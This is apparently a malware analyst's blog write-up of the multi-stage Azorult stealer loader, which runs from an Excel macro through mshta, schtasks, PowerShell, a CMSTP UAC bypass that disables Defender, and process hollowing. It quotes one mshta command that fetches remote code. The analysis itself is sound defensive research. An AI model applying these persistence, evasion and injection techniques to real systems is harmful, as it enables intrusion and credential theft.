This article was published on the 26th of March 2020.
This article was updated on the 3rd of April 2020 and on the 13th of April 2020.
Azorult is an information stealer that steals passwords from installed applications, browser cookies, cryptocurrency wallets, arbitrary files, and more.
Information stealers, like Azorult, have been on the rise in 2019 and early 2020.
In this article, the loading phase of the Azorult stealer is analysed in the usual step-by-step manner.
These stages are written in multiple languages and contain several obfuscation methods, multiple files, a UAC bypass, and a process injection technique.
Additionally, the loader keeps most files in-memory, which lowers the initial detection rate significantly.
This sample is part of Gorgon group’s cluster one, as documented by Prevailion.
While most of the files are kept in-memory, some of them are still stored on the disk.
Some reports call this file-less, whilst others do not.
In this article, it is left up to the reader.
Aside from the above-mentioned, the execution is partly done via binaries that are already present on systems.
These binaries are often called LoLBins: Living of the Land Binaries.
LoLBins are used to perform certain tasks as a feature, which is simply requested by the malware.
This campaign uses multiple LoLBins.
The sample, which is a ZIP folder that contains all stages separately, can be downloaded from VirusBay, Malware Bazaar, or MalShare.
The hashes given below are for the malicious Excel workbook, which is the first stage.
I’d like to thank Itay ‘Megabeets’ Cohen for assisting me in finding the sample.
To view the macros within the Excel workbook, one can use olevba, which is part of the oletools suite.
To install the tools, one has to run the following command:
Note that the used pip has to correspond with the Python version that is on your system.
To see what macros are in the first stage, simply run olevba with the Excel workbook as its sole parameter.
The command is given below.
When reviewing the macros, one has to look for the function that gets executed first.
In this case, this function is named Workbook_BeforeClose.
To evade detection, the macro in this Excel workbook does not execute directly when the document is opened, but rather when it is closed.
Some sandboxes only open the document, which causes the verdict to come back as benign rather than malicious.
Microsoft documented the function here.
The macro is given below.
The Shell function is used to run an executable program, as is stated in the documentation.
The second parameter, which is used to set the window style of the program, is optional.
If it is not included in the call, as is the case in this sample, the window style is set to minimised with focus.
The ipconfig binary is used to print information about the connectivity of the machine.
In this case, the outcome function call is lost.
The only other function call in this function refers to Sheet2.VVV, without any arguments.
This function is given below.
This function has a similar lay-out, although it calls to Sheet1.VVV2, which is given below.
This function creates a WScript.Shell object, which is then used to write a value to the registry.
The strings are split per character.
Below, the function is given with concatenated strings.
The used registry location contains all items that are executed when the system starts.
In this case, the registry key named fgiopoiuytresdfgh contains mshta http:\\j.mp\fgiopoiuytresdfgh.
The Microsoft HTA executable (mshta) is present on all modern Windows systems, and is a LoLBin.
It corrects the backwards slashes to forward slashes, thus validating the address.
The third argument, REG_SZ defines the type of the value that is stored in the registry.
Per Microsoft’s documentation, this type is a null-terminated ANSI or Unicode string.
This function creates a persistence mechanism to execute the payload that is located at the given URL, which is the next stage.
The URL that launches the second stage redirects towards https://pastebin.com/raw/N7bd8WVi.
The script that is hosted there is escaped and obfuscated.
First, the complete script will be unescaped and deobfuscated.
After that, the script will be analysed.
The escaped script is given below.
One can unescape this script in the browser’s console, using the command that is given below.
Note that the […] is a placeholder for the script, which is omitted due to brevity.
The complete decoding command is given below.
As a result, the console will print the unescaped script, which can then be copied into a text editor of choice.
The unescaped script is given below.
The script is obfuscated in several ways.
One way to avoid detection, is to reverse strings.
In this case, the StrReverse function is used to revert the strings back to their original value.
An example is given below.
Additionally, string concatenation is used to avoid detection.
An example of string concatenation is given below.
Once both are removed, the script becomes easily readable, as can be seen below.
The bottom part of the script still contains several string replacement calls.
Below, excerpts from the script are given, together with an explanation.
The main purpose of these two chained replacement calls, is to replace the # character into 0x.
As such, this can be simplified into a single replace call, as is given below.
Redundant calls are often added to confuse antivirus suites and researchers.
The following two strings are only missing the first character.
This causes existing rules that match on full words to fail.
Their values are CurrentDomain and Load respectively.
The last string is only obtained after two string replace calls, and uses a trick to confuse text editors that highlight brackets, as well as analysts who look at the code: the string to be replaced contains an opening bracket.
Since it is a part of the string, there is no need for a closing bracket.
Text editors will expect the next closing bracket to be part of it, which can cause syntax highlighting to malfunction.
The string’s value is invoke.
Lastly, a the Get-Command, abbreviated with GCM, is used to obscure a part of the script.
This cmdlet lists all commands that are installed on the machine, and allows the use of wildcards.
The command GCM *W-O* is used in the script.
The result of the command is given below.
The result of removing all the unnecessary code is a clean script, as can be seen below.
The script is made up out of four blocks of code, which all serve a different purpose.
In this section, all four blocks will be analysed step-by-step.
The first block of code uses schtasks, which is present on all modern Windows systems.
As such, it is a LoLBin.
This tool, short for scheduled tasks, does what its name suggest: it schedules tasks that are executed in the future.
The code of the first block is given below.
A WScript Shell object is instantiated, which then used to execute the concatenated value of xx0 and xx1.
The window style of the executed command is set to hidden using vbHide.
The concatenated value is given below.
The /create flag is used to create a new task.
The /sc flag is short for schedule, which requires the interval type.
In this case, the interval is specified in minutes.
The interval value is set using /mo, which is short for modifier.
The task name is set using /tn.
The task to run is set using /tr.
At last, the /F is used to forcefully create the task and suppress any warning that might come up.
The task that is scheduled calls out to the given address using mshta every 70 minutes, and is named (+dagoD+).
as mentioned before, the mshta binary is a LoLBin.
The given address is the third stage of the loader.
The second block of code in the script is very similar to the first block.
It simply executes the next stage, as can be seen below.
The third stage is executed using a WScript Shell and within a hidden window.
This block ensures that the execution happens directly.
After that, the third stage is executed via the scheduled task every 70 minutes.
The third block adds a new value to the registry key, thereby persisting the call to a specific URL using mshta every time the machine starts.
The code is given below.
The content that resides at the given URL is an empty template script for the WScript Shell.
The template is given below.
Pastes on Pastebin can be edited.
As such, the reoccuring call to this script can be used to execute a different script in the future.
The last block of code in this script executes PowerShell code via the WScript Shell.
The PowerShell script uses a part of the Dot Net Framework to download a string.
The code is given below.
The script that is downloaded, is altered using the replace which makes it a byte array.
After that, the byte array is loaded into the current domain and executed without any additional arguments.
This binary file is the fourth stage.
This script is escaped, similar to previous one.
The same method can be used to unescape the script.
The escaped script is given below.
The unescaped script is given below.
The unescaped script contains string concatenation, reversed strings, a lack of new lines, Get-Command usage, and string replacement calls.
As these techniques have been analysed in the second stage, their removal is not covered here.
The cleaned script is given below.
In this case, the WScript Shell is only used to execute PowerShell code.
As such, the PowerShell code can be extracted from the script, together with new lines to make the code easily readable.
The PowerShell excerpt is given below in four blocks.
Each block will be analysed step-by-step.
The first block of code tests the internet connection quitely.
This part of the script has two use cases.
Firstly, it only continues when there is an internet connection.
If there is none, the loop will continue until the condition is met.
Secondly, it generates legitmate network traffic, which can confuse the behavioral scan that is conducted by antivirus products.
The used cmdlet is documented here by Microsoft.
The second block is used to set the security protocol, which is used in the third block.
The enum value of 3072 refers to TLS 1.2.
Windows supports this since Windows 7.
The value that is set in this block has an effect on all future calls within this script.
In this block, a HTTP request is made to download a base64 encoded script, as can be seen below.
Based on the IEX, which is short for Invoke-Expression, one can deduce that the decoded script is also a PowerShell script.
This script will be analysed in stage 5.
The last block of code downloads yet another string, after which a string replacement call is made.
The value is stored as a byte array.
At last, a variable with an unknown content is loaded into memory, after which a function from an unknown class is called.
The definition and initialisation of the missing data can only be present in the PowerShell script that is downloaded and executed in the third block.
The newly created byte array is used as an argument.
As such, this will also be covered in stage 5.
This stage contains a single script, which is converted into a Dot Net binary, after which it is loaded into memory, from where it is executed.
The command to download and save the binary is given below.
It pipes the variable $Cli2 into the Set-Content cmdlet, which is documented here.
The encoding type is specified as Byte, as it is a binary file.
Analysing a Dot Net binary can be done using dnSpy.
This binary contains only a single class, which is named CMSTPBypass.
Within this class, there are two external functions, both of which are given below.
Additionally, two global variables are also declared and initialised, which are given below.
The main function of the program, which is where the exeuction starts, is given below in full.
After that, the function is analysed in smaller bits.
As can be observed in the code above, the original names are still present in the code.
There is no obfuscation present either.
The first part of the code is given below.
In the code above, a path is created by concatenating the Windows folder to which \temp\ is appended.
The Path.GetRandomFileName function, as documented here, generates a random file name including a random extension.
By splitting the string at the dot, the file name and file extension are split.
Index zero of the resulting array contains the file name, to which the VBScript extension is then appended.
In short, assuming that Windows is installed on the C-drive, a file is created at C:\Windows\temp\[randomName].vbs.
The second line creates a new file based on the given path.
The content of the file is obtained using the GetResource function, which is given below.
The resource manager is used to get load the file based on the given name.
The script that is written to the disk, is given below.
The given script has to run with elevated permissions.
If this isn’t the case, it is launched again.
This loop continues until the code is launched with elevated permissions.
Once it runs with elevated permissions, Windows Defender will be disabled by altering several registry keys.
Additionally, the Set-MpPreference cmdlet, which is documented here, is used to disable even more parts of Windows Defender.
The next part of the code refers back to the VBScript that is given above, and calls the SetInfFile function.
The code is given below.
The stringBuilder variable is filled with the return value of the SetInfFile function, which requires a single parameter: CommandToExecute.
The code of the function is given below.
The function gets a random file name, in the same way as the other random file name is obtained, and refers to the same temp folder within the Windows directory.
In there, a .inf file is created, which is filled with the content from the global InfData variable.
At last, the string REPLACE_COMMAND_LINE is replaced with the argument that is provided to this function.
After that, all data is written to the created path, and the complete path is returned.
The CMSTP binary, to which the global variable BinaryPath contains the full path, is used to add or remove a connection manager profile, as is documented here.
The next part of the code is given below.
The process is started with the /au (short for all users) flag, to install the profile for all users.
Addtitionally, the shell will not be used to install it, there will be no window created, and the window style is hidden.
After the process is created, a loop to get the CMSTP window is entered, and will only be left once the window is found, since the pointer is not null at that point.
Once it is found, the enter key is sent, which confirms the creation of the profile via the defaultly selected OK button.
The code for the SetWindowActive function is given below.
The complete script, including the replacement command, is given below.
This script is the User Account Control bypass that Oddvar Moe blogged about on the 15th of August 2017.
Tyler Applebaum wrote a PowerShell script that is equal to the Dot Net binary that is analysed above.
The complete class can be found here.
The original script to disable Windows Defender can be found here.
By evading the User Account Control, the script can run with elevated privileges, and thus disable Windows Defender succesfully.
The last stage uses two binaries.
The first one is a base64 encoded PowerShell script, which is decoded and then executed.
The code that is used in the malware to achieve this, is given below.
One can simply save the base64 encoded string at the given address, decode it, and store it in a file.
Upon doing so, the following script becomes visible.
By appending the following code, one can save the Dot Net binary.
Inspecting it using dnSpy reveals that it is obfuscated using ConfuserEx v1.0.0.
To deobfuscate the binary, one can use de4dot-cex, which is a modified version of de4dot and supports the deobfuscation of this version of ConfuserEx.
Provide the binary as the sole argument to the program, and the deobfuscated binray will be created in the same directory, as can be seen below.
When opening the cleaned binary in dnSpy, one can read the code normally.
Based on the way the binary is loaded, the class and function that is called first is known.
Addtionally, the parameters are known: “svchost.exe” and the newly obtained byte array.
The code is given below.
The FeeDom function within the Givara class is given below.
This function instantiates a new object and calls a function that is present within the object.
The Daym function is given below.
To understand this function, several other functions need to be analysed first, as they are called within the code that is given above.
The first two functions are given below.
The first function simply concatenates the two given strings, whereas the second function checks if a file exists, based on the given path.
The functions smethod_3 and smethod_4 are given below.
The third function gets the directory of the Dot Net runtime.
The fourth function replaces the value of string_1 with string_2 in string_0.
This clarifies the Daym function above, as it appends if the FTONJ variable to several paths.
The value of FTONJ is equal to svchost.exe, since the variable was passed throughout all function calls prior to this.
After that, the existence of the file is checked.
If it does not exist, the next path is tried.
Once it is found, the tickleme function is called.
The function is given below.
This function simply calls the FUN function, which resides in the class named Fuck.
The FUN function is given below.
This method executes smethod_1 until the function succeeds, with a maximum of five tries.
If none of these five times results in a successful exception, nor a return value of true from smethod_1, the function will return false.
This will cause the code to move on to the next call of the tickleme function within the Daym function, which will eventually reach this point of the code again but then with a different path.
This continues until the smethod_1 call in the FUN function is succesfull, or when all methods have been exhausted.
The smethod_1 is given below in its entirety.
To make the code more readable, the code needs to be refactored.
By analysing and renaming other functions and variables first, the code becomes clearer.
The three arguments, string_1, byte_0, and bool_0 can be renamed into path, data, and protect respectively.
This is based upon the variable names that are used when calling smethod_1 from FUN.
All functions that are named smethod_N, where N is a number, are based upon a single line of code.
As such, renaming these can be done based upon their functionality.
The exception here is smethod_0, which is used together with the FlipString function to instantiate nearly all delegates.
The latter is given below.
This function reverses the given string.
Within all but one delegate instance, a string named string_0 is used.
This string is equal to reverse value of 23lenrek, which is kernel32.
The delegate instances are given below.
Each instance represents a function that is used to inject the malware into the malicious code.
Refactoring each delegate will further clean the code.
Below, the Fuck.smethod_1 is given with the refactored arguments, function names, and delegate names.
In the code above, an injection technique named Process Hollowing is used, as can be read about on the MITRE site.
The function above uses several system calls, where an instance of svchost is launched using the CreateProcessA function.
The dwCreationFlags argument equals 4, which is equal to CREATE_SUSPENDED, as can be seen here.
This means that the process is created, but not started.
After that, a check is done based upon the size of a pointer.
If the pointer pointer size is not equal to 4 bytes (which equals 32-bits), the system architecture is 64-bits.
Based on that, either GetThreadContext Wow64GetThreadContext is called.
On 64-bit systems,the Wow64* name stands for Windows on Windows, as can be read in the documentation.
A call is then made to the ReadProcessMemory function to read the data of the svchost process.
Using ZwUnmapViewOfSection, a view is unmapped from the process.
A view is part of a process’ memory.
A new memory segment is allocated using VirtualAllocEx, to which the Azorult binary is then written using WriteProcessMemory.
Before resuming the thread with ResumeThread, the system should know where to continue the execution, which is done with either SetThreadContext or Wow64SetThreadContext, based on the bitness of the system.
At last, the function returns true.
If anything goes wrong during this process, the svchost process is killed, and the value false is returned.
The used code, before the obfuscation was applied, can be found here.
This way, the Azorult binary is loaded into a hollowed instance of svchost, after which it is executed.
A single Excel document resulted in an attack that consisted of programs and scripts written in several languages: VBA, JavaScript, VBScript, PowerShell, and C#.
Additionally, the UAC was bypassed, most of the execution was done in-memory, Living of the Land Binaries were used, Windows Defender was disabled, and a process injection technique was used.
It is easy to get lost in the details of such an attack, due to the amount of stages, languages and techniques.
Making notes along the way helps a great deal, as well as mapping the stages, be it mentally, digitally, or on paper.
To contact me, you can e-mail me at [info][at][maxkersten][dot][nl], send me a PM on Reddit, or DM me on Twitter @Libranalysis.
